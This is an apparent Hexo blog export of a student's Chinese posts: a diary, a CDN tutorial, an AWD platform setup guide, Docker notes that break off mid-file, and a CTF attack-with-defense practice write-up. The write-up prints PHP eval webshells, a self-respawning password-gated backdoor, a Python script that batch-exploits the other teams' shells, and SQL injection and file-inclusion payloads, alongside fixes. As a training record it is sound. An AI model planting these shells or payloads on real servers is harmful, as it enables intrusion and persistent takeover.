<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IFONLY&#39;s diary</title>
      <link href="/posts/20991101/"/>
      <url>/posts/20991101/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-02-10"><a href="#2020-02-10" class="headerlink" title="2020/02/10"></a>2020/02/10</h1><ul><li>学习了Docker 的一些操作, 准备部署一下AWD环境 玩下最简单的,写写环境搭建文章,相信以后会有师傅用到的</li><li>清理了一下社交圈,比如说取消了微博的无用关注,新加了C9联盟的微博,其实之前我都不用微博,但是微博也可以当做日记功能,所以又下载下来了,所以我这个博客日记也不一定会每天都写,想起了再写吧 0.0</li><li>整理了微信公众号,保留一些报社,主要留下与安全有关的公众号</li></ul><h1 id="2020-02-11"><a href="#2020-02-11" class="headerlink" title="2020/02/11"></a>2020/02/11</h1><ul><li>成功搭建了AWD 环境 ,嘿嘿 开学可以和实验室的小伙伴一起玩咯</li><li>下载了Xshell 这个东西,私认为比Finalshell好用许多,两个一起用吧 0,0</li><li>新增加博客搜索,<del>代码复制</del>,评论功能,修改默认URL格式(设置为/posts/日期),算是给博客大换血吧0,0</li></ul><pre><code>https://github.com/fi3ework/hexo-theme-archer/wiki/%E5%90%AF%E7%94%A8-Algolia-%E6%90%9C%E7%B4%A2</code></pre><p>代码复制功能感觉有点难呀,全网都没找到解决方案,都是 NEXT主题的</p><ul><li>确实减少了许多时间在无意义设计,短视频上,做事情更专注了,人也更快乐了.就是脖子有点不舒服.</li></ul><h1 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020/02/12"></a>2020/02/12</h1><ul><li><p>换了一个博客主题,实现了<code>代码复制</code>功能,但是<del>搜索功能</del>又没了,我决定再也折腾博客这东西了0,0(因为会上瘾</p></li><li><p>玩了一下AWD练习simple难度,但是由于<strong>我难以解决的问题</strong>,无法实现flag刷新,check,因此也无法用脚本批量打</p></li><li><p>瞎折腾了一天,收获还是挺多(假装  </p></li><li><p>码云真香 <a href="https://gitee.com/ifonlyddw/awd-platform" target="_blank" rel="noopener">https://gitee.com/ifonlyddw/awd-platform</a> 以后需要搭建环境的同学呀,可以直接克隆这个仓库哟,速度高到<code>10M+</code></p></li><li><p>em…换了套AWD练习平台,我为什么要选择在这个时候练习一下,主要是囤一些脚本0,0</p></li></ul><h1 id="2020-02-13"><a href="#2020-02-13" class="headerlink" title="2020/02/13"></a>2020/02/13</h1><ul><li><p>使用CDN为博客加速, 可参考我博客的文章来进行,速度爽的飞起,</p><p>更多加速方法 <a href="https://blog.sky03.cn/posts/42790.html" target="_blank" rel="noopener">https://blog.sky03.cn/posts/42790.html</a></p></li><li><p>为博客添加百度和谷歌收录</p></li><li><p>将博客同时部署在github(境外),coding(国内),双线操作,加速访问速度</p></li><li><p>为博客添加robots.txt</p></li><li><p>还是没有搜索功能 0,0</p></li><li><p>em….谷歌全家桶有了</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用CDN(jsdeliver) 优化博客访问速度</title>
      <link href="/posts/20200213/"/>
      <url>/posts/20200213/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CDN的全称是Content Delivery  Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><h1 id="本地创建一个CDN-库"><a href="#本地创建一个CDN-库" class="headerlink" title="本地创建一个CDN 库"></a>本地创建一个CDN 库</h1><p>本地创建一个文件夹用来<strong>存放需要上传的文件</strong></p><p><img src="https://s2.ax1x.com/2020/02/13/1OekNt.png" alt></p><p>比如我这里直接把主题的source文件夹放在CDN上了.因为访问博客的时候,浏览器请求的时候,先去请求这些JS,CSS,图片等资源,然后才会显示博客里面的内容,这也是为什么很多同学访问我的博客会一直卡在<code>最后一公里</code>,一直进不去的原因.</p><h1 id="Github上创建一个repo"><a href="#Github上创建一个repo" class="headerlink" title="Github上创建一个repo"></a>Github上创建一个repo</h1><p>需要先在Github上创建一个repo来存放我们需要CDN来分发的文件</p><p><img src="https://i.loli.net/2020/02/13/bzjHayNYfsQ9oUl.png" alt="创建repo"></p><p>创建完仓库后,记得初始化这个仓库<code>让Github自动生成一个readme.md</code> 即可 不然后面执行命令时候会报错的</p><p><em>在创建完仓库后,需要你操作的第一个操作里面,选择即可</em></p><h1 id="将CDN仓库克隆到本地"><a href="#将CDN仓库克隆到本地" class="headerlink" title="将CDN仓库克隆到本地"></a>将CDN仓库克隆到本地</h1><blockquote><p><strong>1) 复制链接</strong></p></blockquote><p><img src="https://i.loli.net/2020/02/13/QKfem6r8hH2Z57W.png" alt></p><blockquote><p><strong>2)初始化一个新的本地仓库</strong></p></blockquote><p>在第一步创建的文件夹右键,<code>Git Bash here</code>  ( 前提是安装了Git )</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> init<span class="token function">git</span> remote add origin + 复制的链接<span class="token function">git</span> pull origin master <span class="token comment" spellcheck="true">#将仓库拉取到本地文件夹</span></code></pre><blockquote><p><strong>3)为仓库添加文件</strong></p></blockquote><p><code>git add .</code> </p><p>其中,<code>.</code> 表示添加所有文件</p><blockquote><p><strong>4)提交更新</strong></p></blockquote><p><code>git commit -m &#39;first commit&#39;</code> 其中<code>&#39;&#39;</code>中的内容可自定义.即描述内容</p><p>其实这步操作是可以不用滴 0,0</p><blockquote><p><strong>5)推送本地文件到Github仓库</strong></p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push origin master <span class="token comment" spellcheck="true"># 将本地仓库文件推送到Github 仓库</span></code></pre><p><img src="https://i.loli.net/2020/02/13/5O1JFYcRu2jrwmX.png" alt></p><h1 id="为repo设置一个release"><a href="#为repo设置一个release" class="headerlink" title="为repo设置一个release"></a>为repo设置一个release</h1><p><img src="https://s2.ax1x.com/2020/02/13/1OeFAI.png" alt="为repo设置release"></p><p><img src="https://s2.ax1x.com/2020/02/13/1OeA4P.png" alt></p><h1 id="从jsDeliver-引用资源"><a href="#从jsDeliver-引用资源" class="headerlink" title="从jsDeliver 引用资源"></a>从jsDeliver 引用资源</h1><p>使用方法: </p><pre><code>https://cdn.jsdelivr.net/gh/你的用户名/你的仓库名@发布的版本号/文件路径</code></pre><p>比如: </p><p>我这里引用资源的话,就是这样的</p><pre><code>https://cdn.jsdelivr.net/gh/Ifonly-go2019/cdnforblog@1.0.0/source/</code></pre><p>引用成功后,会看到这样的界面: </p><p><img src="https://s2.ax1x.com/2020/02/13/1OePHA.png" alt></p><h1 id="需要修改的地方"><a href="#需要修改的地方" class="headerlink" title="需要修改的地方"></a>需要修改的地方</h1><p>然后在<code>主题的配置文件</code>下</p><p>找到关于CDN加速的配置,填上这个链接即可</p><p>如果可以,在<code>Hexo 的配置文件</code> 下设置如下字段: </p><blockquote><p> 记得把相应内容改为自己的</p></blockquote><pre><code>jsdelivr:  enable: true  gh_user: ifonly-go2019  gh_repo: https://github.com/Ifonly-go2019/cdnforblog  baseUrl: cdn.jsdelivr.net</code></pre><p>ps: 不清楚是否需要设置,我设置了没有报错</p><p>完成了,现在清空一下缓存来看一下访问速度</p><p><img src="https://s2.ax1x.com/2020/02/13/1OQeg0.png" alt></p><h1 id="如果遇到资源更新"><a href="#如果遇到资源更新" class="headerlink" title="如果遇到资源更新"></a>如果遇到资源更新</h1><p>因为之前定义了版本后,资源更新后,就更改下版本后,然后在<code>本地CDN仓库</code>添加或修改文件,然后执行以下命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> pull origin master  <span class="token comment" spellcheck="true">#拉取远程仓库到本地</span><span class="token function">git</span> add <span class="token keyword">.</span><span class="token function">git</span> commit -m <span class="token string">'描述内容'</span><span class="token function">git</span> push origin master  <span class="token comment" spellcheck="true"># 推送到GitHub仓库</span></code></pre><p>enjoy~</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD训练(一) web_yunnan_simple</title>
      <link href="/posts/20200212/"/>
      <url>/posts/20200212/</url>
      
        <content type="html"><![CDATA[<p>首先是这个网站的目录结构</p><p><img src="https://i.loli.net/2020/02/12/B9JyY38G1NFe7vd.png" alt></p><p>一般正常情况下,拿到源码应该都是放在<code>Seay</code>或者<code>D顿</code> 中扫描一下大概,但是这个代码量属实太小了,就直接来吧 0,0</p><h1 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h1><p>有 <code>4</code> 个预留后门</p><p>在<code>a.php</code>中,第一行就是个一句话; 同样的情况在<code>.a.php</code> 也是一个预留后门,在<code>index.php</code>中的<code>1-4</code> 行也是一个预留后门.在<code>config.php</code> 的第<code>19</code>行也存在一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://i.loli.net/2020/02/12/7Vwd9RUn6ENiWJD.png" alt></p><p>成功连上后,可以拿flag 得分,这时候就需要打全场了,因为预留后门发现的早得分肯定越多,因为后门肯定都会删掉</p><p>修复: </p><ul><li>预留后门,直接删掉,删不掉直接注释掉</li></ul><p>批量打脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! Py3</span><span class="token comment" spellcheck="true"># 打全场提交flag脚本</span><span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://ip'</span>url1 <span class="token operator">=</span> <span class="token string">''</span>shell <span class="token operator">=</span> <span class="token string">"a.php/?c=system"</span>port <span class="token operator">=</span> <span class="token string">'80'</span>passwd <span class="token operator">=</span> <span class="token string">'c'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>passwd<span class="token punctuation">:</span> <span class="token string">'cat /flag'</span><span class="token punctuation">}</span>flag_server <span class="token operator">=</span> <span class="token string">'http://flag_sever_ip/flag_file.php?token=%s&amp;flag=%s'</span>team_token <span class="token operator">=</span> <span class="token string">'team1'</span><span class="token comment" spellcheck="true">#自定义提交flag函数,以及一些参数回显</span><span class="token keyword">def</span> <span class="token function">submit_flag</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> teamtoken<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> flag_server <span class="token operator">%</span> <span class="token punctuation">(</span>team_token<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    pos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]Submitting flag:%s:%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pos<span class="token punctuation">)</span>    content <span class="token operator">=</span> response<span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]content:%s'</span> <span class="token operator">%</span> content<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"success"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]submit flag success!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]Failed!'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'webshell_list.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    f1 <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'first_round_flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#循环遍历其他队伍</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">8802</span><span class="token punctuation">,</span> <span class="token number">8803</span><span class="token punctuation">,</span> <span class="token number">8804</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        url1 <span class="token operator">=</span> url<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>shell        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------'</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> requests<span class="token punctuation">.</span>codes<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>url1 <span class="token operator">+</span> <span class="token string">' connect shell sucess!flag is '</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 记录shell和获取的flag</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span>url1 <span class="token operator">+</span> <span class="token string">' connect shell sucess!flag is '</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span>url1 <span class="token operator">+</span> <span class="token string">','</span> <span class="token operator">+</span> passwd<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 获取flag</span>                <span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">'hello world(\w+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">'hello world(\w+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                    submit_flag<span class="token punctuation">(</span><span class="token punctuation">(</span>url1<span class="token punctuation">,</span> team_token<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]Can ont get flag!'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'shell 404!'</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url1 <span class="token operator">+</span> <span class="token string">' connect shell failed!'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    f1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">timer</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        flag<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 每 5 分钟 提交一次flag</span>timer<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span></code></pre><p>由于部署环境问题,无法实现check 和 flag 动态刷新,故脚本无法得到验证,遂结束了这个思路,哎,就当是审计CMS :black_flag:</p><h1 id="后台登录处存在sql注入"><a href="#后台登录处存在sql注入" class="headerlink" title="后台登录处存在sql注入"></a>后台登录处存在sql注入</h1><p>在<code>login.php</code> 第4,5,6行中,对用户输入的内容并没有<code>过滤措施</code>,导致可以使用<code>万能密码</code>登录后台</p><p>payload: </p><blockquote><p>username: <code>1&#39; or 1=1#</code> password: 随便; 登录进去后就有一个flag,提交即可.</p></blockquote><p><img src="https://i.loli.net/2020/02/12/uZI4UpYQF9NMsrn.png" alt></p><p>修复: </p><blockquote><p>使用<code>addslashes() 函数</code> 转义单引号,关闭<code>mysql_error()</code>报错</p></blockquote><p>批量打脚本</p><h1 id="后台文件上传处存在任意文件上传"><a href="#后台文件上传处存在任意文件上传" class="headerlink" title="后台文件上传处存在任意文件上传"></a>后台文件上传处存在任意文件上传</h1><p><img src="https://i.loli.net/2020/02/12/ANt9Q2sirHOLnye.png" alt></p><p>在 <code>upload.php</code> <code>30</code>中,截取了文件的后缀,并拼接到 <code>44</code>行中的最终的文件路径中,并没有对文件后缀进行判断,<code>导致了任意文件上传,可以拿到phpinfo信息,以及上传webshell</code></p><p>修复: </p><p>最简单的修复( 利用注释 )<code>隐藏上传文件的路径</code> 大概率会被<code>check</code> </p><pre class=" language-PHP"><code class="language-PHP">//echo "上传成功：/upload/".$time.$name1;</code></pre><p>并且想了一下,<strong>这种方式是不可行的,因为每个队伍都有相同的源码.</strong></p><p><img src="https://i.loli.net/2020/02/12/dMA5qIvmbTtlU8G.png" alt></p><p>连上shell以后,发现只是<code>www-data</code>权限,无法删除对方的<code>www</code>目录.此时可以往对方服务器里面种<code>不死马</code>( 进行<strong>权限维持</strong> ).</p><pre class=" language-PHP"><code class="language-PHP"><?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = './.index.php';$code = '<?php if(md5($_POST["pass"])=="6b0e7de3b4c005c6d03cd7e3f237e061"){@eval($_POST[a]);} ?>';//pass=IFONLY 不死马用法：不死马.php?pass=IFONLY&a=commandwhile (1){    file_put_contents($file,$code);    usleep(5000);}?></code></pre><p><strong>这里用蚁剑连上后,拿到flag,网站源码自动就被删除了( Team4 )</strong></p><p><img src="https://i.loli.net/2020/02/12/GegsHM2Z1jPIFDx.png" alt></p><p>从phpinfo界面得到网站目录为<code>/var/www/html</code> </p><p><code>allow_url_fopen = On allow_url_include= Off</code> 说明可能利用PHP伪协议进本地文件包含</p><p><code>disable_functions</code> 并没有禁用完全,可能存在 <code>RCE</code></p><p>限制了上传文件大小 <code>&lt; 2M</code> <code>Phar.readonly = On</code> </p><h1 id="在页脚shell功能处存在任意命令执行"><a href="#在页脚shell功能处存在任意命令执行" class="headerlink" title="在页脚shell功能处存在任意命令执行"></a>在页脚shell功能处存在任意命令执行</h1><p>在 <code>footer.php</code> 的第2,3行</p><p><img src="https://i.loli.net/2020/02/12/tES9hGA5DajpR1V.png" alt></p><p>这里就相当于一个预留后门了,如果不修复可以一直<code>cat /flag</code> 拿flag得分</p><blockquote><p>思考: 如何最大化利用?</p></blockquote><p>修复: </p><ul><li>简单粗暴的直接注释掉<code>system($shell)</code> ,还是一样,大概率会被<code>check</code></li><li>把可执行的命令写死: </li></ul><pre class=" language-PHP"><code class="language-PHP">$shell=$_POST['shell'];$shell = 'ping';system($shell.'127.0.0.1');</code></pre><ul><li>最好的办法</li></ul><p>在<code>disable_functions</code> 中禁用掉<code>system()</code></p><ul><li>白名单检测</li></ul><h1 id="关于界面处存在本地文件包含漏洞"><a href="#关于界面处存在本地文件包含漏洞" class="headerlink" title="关于界面处存在本地文件包含漏洞"></a>关于界面处存在本地文件包含漏洞</h1><pre class=" language-PHP"><code class="language-PHP"><?php   $file=$_GET['file'];   include $file;?></code></pre><p>payload: </p><p><code>about.php?file=php://filter/read=convert.base64-encode/resource=login.php</code></p><p>但是这个拿不到flag,但没关系,学习是第一步!!</p><p>修复: </p><ul><li>通过白名单来限制可以包含的文件</li></ul><h1 id="admin-header-php中存在任意命令执行"><a href="#admin-header-php中存在任意命令执行" class="headerlink" title="admin/header.php中存在任意命令执行"></a>admin/header.php中存在任意命令执行</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$p</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$p</span><span class="token punctuation">;</span>   <span class="token variable">$q</span><span class="token operator">=</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>只需要利用<code>p = &#39;cat /flag&#39;</code> 即可打出flag</p><p>修复: 直接注释掉输出,<code>var_dump()</code></p><pre class=" language-PHP"><code class="language-PHP">//var_dump($q);</code></pre><p>还是好好学习基础吧 -.- </p><p>屯脚本的事情以后再说</p>]]></content>
      
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD_Platform_Env_With_Ubuntu&amp;Docker</title>
      <link href="/posts/20200211/"/>
      <url>/posts/20200211/</url>
      
        <content type="html"><![CDATA[<p><strong>关于CTF 线下赛的一些科普:</strong> </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/introduction/mode-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/introduction/mode-zh/</a></p><p><strong>平台项目地址</strong></p><p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="noopener">https://github.com/zhl2008/awd-platform</a> </p><p><a href="https://github.com/zhl2008/awd-platform/blob/master/AWD%E7%BA%BF%E4%B8%8B%E7%8E%AF%E5%A2%83%E6%89%8B%E5%86%8C.md" target="_blank" rel="noopener">环境手册</a></p><p>by Hence Zhang @Lancet</p><p><strong>网络拓扑结构</strong></p><p><img src="https://raw.githubusercontent.com/Ifonly-go2019/awd-platform/master/%E6%AF%94%E8%B5%9B%E5%85%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt></p><p><strong>环境搭建流程</strong></p><p>1)下载平台文件到云服务器</p><pre><code>git clone https://github.com/zhl2008/awd-platform</code></pre><p>2)切换到目录下awd-platform目录下 pull docker 镜像</p><pre><code>cd awd-platform</code></pre><pre><code>sudo docker pull zhl2008/web_14.04</code></pre><pre><code>sudo docker tag zhl2008/web_14.04 web_14.04 </code></pre><p>这里用 tag 改名,由docker 源码中的名字决定</p><p>3)建立队伍</p><p>比如,这里建立web_yunnan_simple 这个赛题,启用4支队伍</p><pre><code>python batch.py web_yunnan_simple 4</code></pre><p><img src="https://i.loli.net/2020/02/11/daeEC1Z9Gm7kT2i.png" alt="启动比赛队伍数量.png"></p><p>是一个全自动化的, 节约时间在搭建环境上, 专注于安全</p><p>4)启动比赛</p><p>4 表示 4 支队伍</p><pre><code>python start.py ./ 4</code></pre><p>也可以启动 check 脚本</p><p>但是这个check 好像用不了,嗯,反正也是练习,知道down 了就修就好了 0.0</p><pre><code>sudo docker exec check_server python check.py</code></pre><p><img src="https://i.loli.net/2020/02/11/bDxNVLlej6q5HGz.png" alt></p><p>5) 查看队伍网络映射情况</p><p><img src="https://i.loli.net/2020/02/11/DMbitnvHRrSw81j.png" alt></p><table><thead><tr><th align="center">队伍ID</th><th>靶机地址</th></tr></thead><tbody><tr><td align="center">Team 1</td><td>VPS ip:8081</td></tr><tr><td align="center">Team 2</td><td>VPS ip:8082</td></tr><tr><td align="center">Team 3</td><td>VPS ip:8083</td></tr><tr><td align="center">Team 4</td><td>VPS ip:8084</td></tr><tr><td align="center">Flag bot</td><td>VPS ip:8080</td></tr></tbody></table><p>SSH 密码在项目文件夹下的 pass.txt 中</p><p><img src="https://i.loli.net/2020/02/11/ZoswT5CJVODr3WB.png" alt></p><table><thead><tr><th>队伍ID</th><th>SSH端口号</th></tr></thead><tbody><tr><td>team1</td><td>2201</td></tr><tr><td>team2</td><td>2202</td></tr><tr><td>team3</td><td>2203</td></tr><tr><td>team4</td><td>2204</td></tr></tbody></table><p><img src="https://i.loli.net/2020/02/11/nZhLjH9cXg6J4KE.png" alt></p><blockquote><p>在项目的<code>flag_server</code>中,要设置score.txt 和 result.txt 777 权限, 进行分数变化同步</p></blockquote><p><img src="https://i.loli.net/2020/02/11/JSziLaCMsZ6AWjc.png" alt></p><p>flag 提交方式: </p><pre><code>VPS ip:8080/flag_file.php?token=teamx&amp;flag=**** (x 为队伍号)</code></pre><p>新的比赛规则中</p><pre><code>http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag 来获得相应的分数。例如：flag server地址为8.8.8.8，端口为8080，队伍token为team1，flag为40ed892b93997142e46124516d0f5ac0，则请求http://8.8.8.8:8080/flag_file.php?token=team1&amp;flag=40ed892b93997142e46124516d0f5ac0来获得相应分数。每次成功攻击可获得2分，被攻击者扣除2分；有效攻击两分钟一轮；选手需要保证己方服务的可用性，每次服务不可用，扣除1分,服务可用，加1分；服务检测两分钟一轮</code></pre><p>查看攻击情况和当前分数</p><pre><code>攻击情况url地址：http://flag服务器IP:端口/result.txt得分情况地址：http://flag服务器IP:端口/score.txt</code></pre><p><img src="https://i.loli.net/2020/02/11/mpVroHxzd5LWhR4.png" alt></p><p>到这里,AWD环境也就基本差不多搭建好了(提交flag 还存在一些问题,比如不同的练习,要改flag,提交flag的不正确,flag并不是每两分钟刷新的,被攻击的队伍的分数也并不会减为负的). 当然还可以美化一下界面.</p><blockquote><p><strong>我这里就以练习为主了,能打出flag就行了,所以并不想修上面的一些问题( 懒</strong></p></blockquote><p>结束练习</p><pre><code>sudo python stop_clean.py</code></pre><p>Enjoy ~</p>]]></content>
      
      
      <categories>
          
          <category> 线下AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker_Basic_Learning_Note</title>
      <link href="/posts/20200210/"/>
      <url>/posts/20200210/</url>
      
        <content type="html"><![CDATA[<p>参考资料: </p><p><a href="https://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p><p><strong>Docker 的优点</strong></p><blockquote><p>Docker 是一个用于开发，交付和运行应用程序的开放平台。Docker 使您能够将应用程序与基础架构分开，从而可以快速交付软件。借助 Docker，您可以与管理应用程序相同的方式来管理基础架构。通过利用 Docker 的方法来快速交付，测试和部署代码，您可以大大减少编写代码和在生产环境中运行代码之间的延迟。</p></blockquote><p>简而言之, 就是为了方便,快速</p><p><strong>Docker 架构</strong></p><p>Docker 包括上基本概念: </p><ul><li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统</li><li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等</li><li><strong>仓库（Repository）</strong>：仓库可看着一个代码控制中心，用来保存镜像</li></ul><p>Docker 使用<code>C/S</code>(<strong>客户端-服务器</strong>)架构模式.使用远程 API 来管理和创建Docker容器      </p><p><img src="https://www.runoob.com/wp-content/uploads/2016/04/576507-docker1.png" alt></p><p>安装教程就自己去网上找资料看了-.-</p><p>我是按照菜鸟教程来安装的,安装的版本为 <strong>5:18.09.1<del>3-0</del>ubuntu-bionic</strong></p><p>问了下实验室的师傅,<strong>如果只是复现漏洞,docker版本低没影响</strong>,如果要用docker开发就需要用最新版.</p><p>使用<code>sudo docker run hello-world</code> 来测试是否安装成功,真是什么都是hello world啊~</p><p> <a href="https://y0ngb1n.github.io/a/docker-registry-mirrors.html" target="_blank" rel="noopener">Docker hub 镜像加速</a></p><p>个人觉得下面这个设置了是成功的.可以先设置这个,节约下载时间.简直快到爽啊~</p><p><a href="https://www.jianshu.com/p/405fe33b9032" target="_blank" rel="noopener">Docker 中国源</a></p><p>在 <code>/etc/docker/daemon.json</code> 中复制下这段代码,修改 daemon,即可.</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>    #<span class="token string">"http://ovfftd6p.mirror.aliyuncs.com"</span><span class="token punctuation">,</span>(这个必须有阿里云服务器对应的ID<span class="token punctuation">)</span>    <span class="token string">"http://registry.docker-cn.com"</span><span class="token punctuation">,</span>    <span class="token string">"http://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"insecure-registries"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"registry.docker-cn.com"</span><span class="token punctuation">,</span>    <span class="token string">"docker.mirrors.ustc.edu.cn"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"debug"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token 